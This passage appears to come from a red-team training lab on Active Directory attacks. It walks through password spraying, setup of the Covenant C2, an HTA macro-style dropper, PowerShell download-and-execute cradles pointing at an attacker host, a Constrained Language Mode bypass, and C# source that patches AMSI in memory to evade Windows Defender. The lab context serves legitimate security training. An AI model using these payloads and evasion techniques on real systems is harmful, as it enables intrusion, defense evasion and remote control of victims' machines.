<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">.<span class="hljs-regexp">/atomizer.py owa targetowaserver.example.com February2020 /</span>root<span class="hljs-regexp">/Desktop/u</span>sers.txt<br></code></pre></div></td></tr></table></figure>

<p>This way, account lockout might be avoided. However, security-savvy companies may be monitoring such attempts.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a> is another effective password spraying tool, using which one can easily conduct a password spraying attack against OWA or Exchange servers.</p>
<p>The last method to obtain credentials is through phishing portals. It is fairly easy to craft a spoofed Google login page. The real art is to create it in a way that will allow for actual logging into the “Real” service behind without the victim noticing.</p>
<p>Custom scripts can always be developed to do that but tools like <a target="_blank" rel="noopener" href="https://github.com/drk1wi/Modlishka">https://github.com/drk1wi/Modlishka</a> or <a target="_blank" rel="noopener" href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a> have already been developed to facilitate such attacks.</p>
<p>Setting up <em>evilginx</em> will require you to set up your own domain. Among the advantages of using this tool is a pre-configured set of phishing templates named phishlets, which are compatible with evilnginx. This allows for quickly setting up an effective phishing campaign.</p>
<p>It is about time we set up a C2 that will handle incoming connections. For the time being, let’s build a simple infrastructure on top of our two aforementioned Virtual Machines. In a real-life scenario you would possibly like to have a more complex infrastructure, like the one we already mentioned in the beginning of this document.</p>
<h2 id="Setting-up-Covenant-Perform-this-on-your-attacking-machine"><a href="#Setting-up-Covenant-Perform-this-on-your-attacking-machine" class="headerlink" title="Setting up Covenant (Perform this on your attacking machine)"></a>Setting up Covenant (Perform this on your attacking machine)</h2><p>We will use Covenant C2 which can be downloaded from its GitHub page, <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a>. The installation instructions for the tool can be found at <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">https://github.com/cobbr/Covenant/wiki/Installation-And-Startup</a></p>
<p>Covenant can also be run from a docker repository. This is the installation way we chose. That being said, you can proceed with a permanent installation on your attacking machine.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone --recurse-submodules https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/cobbr/</span>Covenant <br>cd Covenant/Covenant <br>docker build -t covenant . <br>docker run -it -p <span class="hljs-number">7443</span>:<span class="hljs-number">7443</span> -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> -p <span class="hljs-number">443</span>:<span class="hljs-number">443</span> --name covenant -v &lt;<span class="hljs-regexp">/absolute/</span>path<span class="hljs-regexp">/to/</span>Covenant<span class="hljs-regexp">/Covenant/</span>Data&gt;:<span class="hljs-regexp">/app/</span>Data covenant<br></code></pre></div></td></tr></table></figure>

<p>Notice that you may want to issue a command like the below, as the last step.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -it -p <span class="hljs-number">7443</span>:<span class="hljs-number">7443</span> -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> -p <span class="hljs-number">443</span>:<span class="hljs-number">443</span> --name covenant -v `pwd`/Data:/app/Data covenant<br></code></pre></div></td></tr></table></figure>

<p>If everything goes according to plan, you should see output similar to the below.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image9.png" srcset="/img/loading.gif"></p>
<p>You can now visit <a target="_blank" rel="noopener" href="https://127.0.0.1:7443/">https://127.0.0.1:7443</a> to start working with Covenant. Note, that it is listening on 0.0.0.0. In a real-life scenario you should never allow the C2 administrative interface to be exposed externally.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image10.png" srcset="/img/loading.gif"></p>
<p>We will set up the administrative user “redteam” with a password of “redteam”.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image11.png" srcset="/img/loading.gif"></p>
<p>Let’s go to Listeners and press Create</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image12.png" srcset="/img/loading.gif"></p>
<p>If you are running Covenant from docker, you may need to change the IP from the docker IP to your VM’s external IP. Additionally, you can change the listener name, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image13.png" srcset="/img/loading.gif"></p>
<p>You should see the Listener being created.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image14.png" srcset="/img/loading.gif"></p>
<h2 id="Covenant-Launchers-and-Grunts-Practice-this-on-your-attacking-machine"><a href="#Covenant-Launchers-and-Grunts-Practice-this-on-your-attacking-machine" class="headerlink" title="Covenant Launchers and Grunts (Practice this on your attacking machine)"></a>Covenant Launchers and Grunts (Practice this on your attacking machine)</h2><p>Now, for each listener you need to create a Launcher. Launcher is the implant “loader” associated with its parent listener, and upon being run on a Windows system it will connect back to the listener it is associated with. Let’s go to Launchers:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image15.png" srcset="/img/loading.gif"></p>
<p>Note that Covenant offers plenty of launchers. Moreover, each launcher can be wrapped in your own custom dropper that fits the constraints of the targeted environment best. Proper recon, enumeration and OSINT can help you choose the best launcher for each scenario and any technical constraints of the targeted environment.</p>
<p>This time, we will choose the PowerShell Launcher.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image16.png" srcset="/img/loading.gif"></p>
<p>We will leave the default options. When you click on Generate, the Launcher and the Encoded launcher will appear, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image17.png" srcset="/img/loading.gif"></p>
<p>Let’s now go to the Host tab at the top of the page and insert a URL under which the payload will be hosted. Then, press “Host”.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image18.png" srcset="/img/loading.gif"></p>
<p>If you now look at the Launcher fields, you will notice that they contain updated launcher code.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image19.png" srcset="/img/loading.gif"></p>
<p>Stager/Launcher contains the payload used to control the remote machine. Once a machine is compromised, it will become visible under “Grunts”. A Grunt in Covenant represents a compromised machine.</p>
<p><strong>Payload Delivery</strong></p>
<p>As we now have a command to execute, we should also prepare a payload delivery mechanism. <strong>Note that the below technique was performed on an offline, local machine. You will have the opportunity to use launchers against the lab environment shortly!</strong></p>
<p>The “traditional” way of delivering a payload involves an Office document containing a macro. When choosing that technique, remember that saving a word document as <strong>Word 97-2003 document</strong> can help you to avoid the .docm extension which is considered malicious. However, you should be aware that many AV products already flag macros that run PowerShell as malicious.</p>
<p>You can try to deliver the payload in a less obvious way, using a .hta file.</p>
<p>HTA is HTML Application and is considered a less-known attack vector than a Macro document.</p>
<p>Save Following file as “Document.hta” on your Kali (attacker) machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vba">&lt;script language=&quot;VBScript&quot;&gt;<br>Function DoStuff()<br>Dim wsh<br>Set wsh = CreateObject(&quot;Wscript.Shell&quot;) <br>wsh.run &quot;powershell -Sta [YOUR LAUNCHER]&quot; <br>Set wsh = Nothing<br>End Function <br>DoStuff<br>self.close <br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image20.png" srcset="/img/loading.gif"></p>
<p>The .hta file can be hosted by Covenant as well, so you don’t need to create separate HTTP server. Simply go to the Listener you created in the beginning and then navigate to the Hosted Files tab at the top of the page. Click on “Create” and choose the .hta file. Finally, press “Create” again.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image21.png" srcset="/img/loading.gif"></p>
<p>We can now go to our Windows victim machine. Simply open Internet Explorer and go to .</p>
<p><strong>http://[ATTACKER_IP]/Document.hta</strong></p>
<p>Note that the default option is <em>Open</em>, so let’s choose it, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image22.png" srcset="/img/loading.gif"></p>
<p>Windows will then display a warning, which many users might click through anyway. Name and publisher seems to be trusted, it’s Microsoft!</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image23.png" srcset="/img/loading.gif"></p>
<p>After Allow is clicked, we can go to our Attacker machine to the “Grunts” tab. A new victim has just been registered.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image24.png" srcset="/img/loading.gif"></p>
<p>Clicking on the Grunt’s name allows for further interaction, by using the Interact and Task tabs.</p>
<p>Interact allows for command line interaction.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image25.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image26.png" srcset="/img/loading.gif"></p>
<p>Note that the results of commands issued using Task will be visible in Taskings.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image27.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image28.png" srcset="/img/loading.gif"></p>
<p>You can control a Grunt’s frequency of “connect-backs” by configuring the Delay value (in seconds) with a percentage of that value as jitter.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image29.png" srcset="/img/loading.gif"></p>
<p>For example, a default Grunt will communicate back to Covenant every 4.5 to 5.5 seconds (5s +/- 10%)</p>
<p><strong>It is about time we get our hands dirty in the lab environment. This lab environment has been created as a playground and its nature is educational. This means that you should just follow along and replicate what you read in the lab environment, without trying to figure out attack paths yourself. Don’t worry! Two other Active Directory labs exist, where you will figure out the attack paths yourself. First, let’s create a new listener as follows. ConnectAddress should be your tap0 IP.</strong></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image30.png" srcset="/img/loading.gif"></p>
<p>After the listener is created, we can go to “Launchers”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image31.png" srcset="/img/loading.gif"></p>
<p>Let’s create a PowerShell Launcher specifying the GruntHTTP template.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image32.png" srcset="/img/loading.gif"></p>
<p>Click “Generate”, go to the “Host” tab and name it as you wish (we will use http.ps1), then click “host”.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image33.png" srcset="/img/loading.gif"></p>
<p>A new launcher one-liner will appear. This will be run on first machine that we compromise, helping us establish our first HTTP grunt.</p>
<h1 id="INITIAL-ACCESS"><a href="#INITIAL-ACCESS" class="headerlink" title="INITIAL ACCESS"></a>INITIAL ACCESS</h1><p><strong>As already mentioned, you may receive a different address when connecting to VPN (tap0 IP). Pay attention to use this IP as the “connect-back” address.</strong></p>
<h2 id="Compromising-Win10-WEB"><a href="#Compromising-Win10-WEB" class="headerlink" title="Compromising Win10-WEB"></a>Compromising Win10-WEB</h2><p>In order to compromise win10-web, we will try password spraying against the exposed RDP service. We can identify that RDP is enabled through a Nmap scan on all TCP ports. We know that a user named <strong>victim</strong> uses this workstation and that the domain name is <strong>ELS-CHILD</strong>.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image34.png" srcset="/img/loading.gif"></p>
<p>Let’s try to attack the <strong>ELS-CHILD\VICTIM</strong> user with some extremely guessable passwords for example, July2020, July2020!, Summer2020 and Summer2020!</p>
<p>We will use <a target="_blank" rel="noopener" href="https://github.com/xFreed0m/RDPassSpray">https://github.com/xFreed0m/RDPassSpray</a></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 RDPassSpray.py -u victim -p Summer2020! -d ELS-CHILD -t 10.100.10.240:65520<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image35.png" srcset="/img/loading.gif"></p>
<h2 id="First-Grunt"><a href="#First-Grunt" class="headerlink" title="First Grunt"></a>First Grunt</h2><p>As you now have RDP access to the WIN10-WEB machine, go ahead and use that access to download and execute the first Covenant grunt. Connect with rdesktop or any other rdp client of choice and use the discovered credentials to sign in.</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rdesktop 10.100.10.240:65520<br></code></pre></div></td></tr></table></figure>

<p>Note that we created another PowerShell launcher and hosted it as 1.ps1 in the same way as described above.</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">iex</span> (<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.100.10.2/1.ps1&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image36.png" srcset="/img/loading.gif"></p>
<p>Unfortunately, we cannot proceed yet due to Constrained Language Mode.</p>
<h2 id="CLM-Bypass"><a href="#CLM-Bypass" class="headerlink" title="CLM Bypass"></a>CLM Bypass</h2><p>CLM stands for PowerShell Constrained Language Mode, which is able to limit PowerShell to core types only. If a proper level of restriction is implemented, the user will not be able to access .NET or execute complex scripts like Covenant launchers.</p>
<p>CLM can be set by editing a global environment variable named __PSLockdownPolicy. When its value is equal to 8 PowerShell operates in Full Language Mode (which means no restrictions). On WIN10-WEB it was set to 4, which is Constrained Language Mode.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image37.png" srcset="/img/loading.gif"></p>
<p>In such a case, even if we are an Administrator, we cannot make use of all Powershell features while Constrained Language Mode is on. If you have the possibility to interact with the target system only via the command line, you can disable CLM by issuing the following command while in the context of NT Authority/SYSTEM:</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">setx __PSLockdownPolicy <span class="hljs-string">&quot;8&quot;</span> <span class="hljs-string">/M</span><br></code></pre></div></td></tr></table></figure>

<p>The result can be checked by issuing the below command in PowerShell.</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode<br></code></pre></div></td></tr></table></figure>

<p>Back in the lab, let’s now try to read a file while PowerShell operates in Constrained Language Mode.</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">[<span class="hljs-type">System.IO.File</span>]::ReadAllBytes(“C:\Windows\System32\license.rtf”)<br></code></pre></div></td></tr></table></figure>

<p>Unfortunately, the attempt was unsuccessful due to CLM.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image38.png" srcset="/img/loading.gif"></p>
<p>Let’s use a CLM bypass technique that can be found on the below repository.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a></p>
<p>The .dll is precompiled in the x64 folder. For convenience, we renamed it to ps.dll and transferred it to our victim machine:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image39.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image40.png" srcset="/img/loading.gif"></p>
<p>Now, the bytes can be successfully read.</p>
<p>With GUI access (and enough rights), these settings can be adjusted manually. If we set the system environment variable to 8 and spawn a new PowerShell window, we should be able to use “Full Language Mode”.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image41.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image42.png" srcset="/img/loading.gif"></p>
<p><strong><em>Note, that this method is applicable only when CLM is set up locally. When pairing PowerShell v5 with AppLocker, Constrained Language Mode can no longer be easily bypassed.</em></strong></p>
<p>After setting the environment variable to 8, launch a new PS window as administrator and re-enter the launcher command</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span> (<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.100.10.2/1.ps1&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image43.png" srcset="/img/loading.gif"></p>
<p>After a short while we can observe a new GruntHTTP being spawned.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image44.png" srcset="/img/loading.gif"></p>
<h2 id="Windows-Defender-and-AMSI"><a href="#Windows-Defender-and-AMSI" class="headerlink" title="Windows Defender and AMSI"></a>Windows Defender and AMSI</h2><p>AMSI stands for “Anti-Malware Scan Interface” and it is another feature of Windows Defender for detecting malicious actors. AMSI is targeted especially at malicious scripts and other less obvious/dangerous programmatic components.</p>
<p>AMSI can perform detection also in a heuristic way, which means that a program’s behavior is one of criteria to flag it as malicious or not. Moreover, it can perform in-memory detection by loading the AMSI module into each process’ memory.</p>
<p><strong>Note, that in the below exercise we use the “AdminELS” user who is also a user of Win10-WEB. Since you have administrative privileges on that workstation, you can change AdminELS’ password and impersonate him.</strong></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image45.jpeg" srcset="/img/loading.gif" alt="the AMSI architecture"></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg">https://docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg</a></p>
<p>In order to enable / disable AMSI:</p>
<p>Go to Windows Security -&gt; Virus &amp; Threat Protection and make sure that it is turned on.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image46.png" srcset="/img/loading.gif"></p>
<p>You can now try to trigger an AMSI signature by typing into a PS window “AmsiScanBuffer” as one string and also separately. Can you see the difference?</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image47.png" srcset="/img/loading.gif"></p>
<p>This means that it might be possible to bypass AMSI by obfuscation (one of many possible ways of bypassing AMSI). If you try to execute Covenant’s payload, you will be blocked by AMSI:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image48.png" srcset="/img/loading.gif"></p>
<p>If you go to Virus &amp; Threat protection, you will be able to see what types of threats have been identified. We can see that the word “AmsiScanBuffer” was detected as something that looks like “AMSI Tampering” and a Covenant launcher is properly identified.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image49.png" srcset="/img/loading.gif"></p>
<p>Let’s try to utilize obfuscation in order to bypass AMSI on the machine and execute Covenant launcher.</p>
<p>We can use a publicly available tool named AmsiScanBufferBypass from rasta-mouse. It can be found on the github repository below.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/AmsiScanBufferBypass">https://github.com/rasta-mouse/AmsiScanBufferBypass</a></p>
<p>Let’s download the repository content. If you try to utilize the .ps1 bypass script immediately it will probably be detected.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image50.png" srcset="/img/loading.gif"></p>
<p>At the time of creating this course the C# AMSI bypass version is also detected.</p>
<p>Let’s repurpose the C# Version with the same example found in page 55 from the Evasion module. The code used will be the following:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Runtime.InteropServices;<br><span class="hljs-comment">// Andres Doreste, ASB Bypass mod without using GetProcAddress</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Amsi</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">static</span> byte[] patch = <span class="hljs-keyword">new</span> byte[] &#123; <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC3</span> &#125;;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Bypass</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;   <br>            <span class="hljs-comment">// Returns amsi.dll address</span><br>            var lib = Win32.LoadLibrary(<span class="hljs-string">&quot;amsi.dll&quot;</span>);<br>            <span class="hljs-comment">// Locate ASB Function by amsi.dll address + 0x2540 (9536)</span><br>            IntPtr ASBPtr = <span class="hljs-keyword">new</span> IntPtr(lib.ToInt64() + <span class="hljs-number">9536</span>);<br>            <span class="hljs-comment">// Change memory protection to PAGE_READWRITE</span><br>            uint oldProtect;<br>            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, <span class="hljs-number">0x04</span>, out oldProtect);<br>            <span class="hljs-comment">// Apply the patch</span><br>            Marshal.Copy(patch, <span class="hljs-number">0</span>, ASBPtr, patch.Length);<br>            <span class="hljs-comment">// Change memory protection to PAGE_EXECUTE_READ</span><br>            Win32.VirtualProtect(ASBPtr, (UIntPtr)patch.Length, <span class="hljs-number">0x20</span>, out oldProtect);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)<br>        &#123;<br>            Console.WriteLine(<span class="hljs-string">&quot; [x] &#123;0&#125;&quot;</span>, e.Message);<br>            Console.WriteLine(<span class="hljs-string">&quot; [x] &#123;0&#125;&quot;</span>, e.InnerException);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Win32</span></span><br><span class="hljs-class">&#123;</span><br>    [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">LoadLibrary</span><span class="hljs-params">(<span class="hljs-built_in">string</span> name)</span></span>;<br><br>    [DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">VirtualProtect</span><span class="hljs-params">(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>This can be compiled in Visual Studio.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image51.png" srcset="/img/loading.gif"></p>
<p>Or via the following command in your Kali Box if the mono-complete package is installed:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">mcs <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Program</span>.</span></span>cs -sdk:<span class="hljs-number">4</span> -target:library -out:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ASBBypass</span>.</span></span>dll<br></code></pre></div></td></tr></table></figure>

<p>Let’s transfer that dll to the attacking machine. We renamed it for convenience to simply a.dll and started a python http server in that directory.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image52.png" srcset="/img/loading.gif"></p>
<p>Then, we downloaded and loaded it using .NET reflection from PowerShell:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> http://<span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span>:<span class="hljs-number">7777</span>/a.dll <span class="hljs-literal">-outfile</span> a.dll<br>[<span class="hljs-type">System.Reflection.Assembly</span>]::LoadFile(<span class="hljs-string">&quot;c:\users\adminels\a.dll&quot;</span>)<br>[<span class="hljs-type">Amsi</span>]::Bypass()<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image53.png" srcset="/img/loading.gif"></p>
<p>Now we are able to “hook” the machine using the Covenant stager without getting detected.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image54.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image55.png" srcset="/img/loading.gif"></p>
<p>Note that the bypass has been performed using a Medium integrity PS process.</p>
<h2 id="Reconnaissance-after-compromise"><a href="#Reconnaissance-after-compromise" class="headerlink" title="Reconnaissance after compromise"></a>Reconnaissance after compromise</h2><p>Next steps to take are related to post exploitation activities. Before we start, it is necessary to figure out what actions can be made without alerting any monitoring or EDR solutions which for sure will be present in an attacked organization.</p>
<p>One of the post-exploitation modules included in Covenant that is related to situational awareness is Seatbelt.</p>
<p>SeatBelt.exe is a multi-feature commandline tool that focuses on gathering various information about the underlying OS. The full documentation is available online <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt/blob/master/README.md">here</a>.</p>
<p>It can be invoked with the “full” argument which will cause the tool to perform all the checks it is capable of doing, while you can force just specific tests when passing the checks names as subsequent arguments (Case sensitive!), e.g.</p>
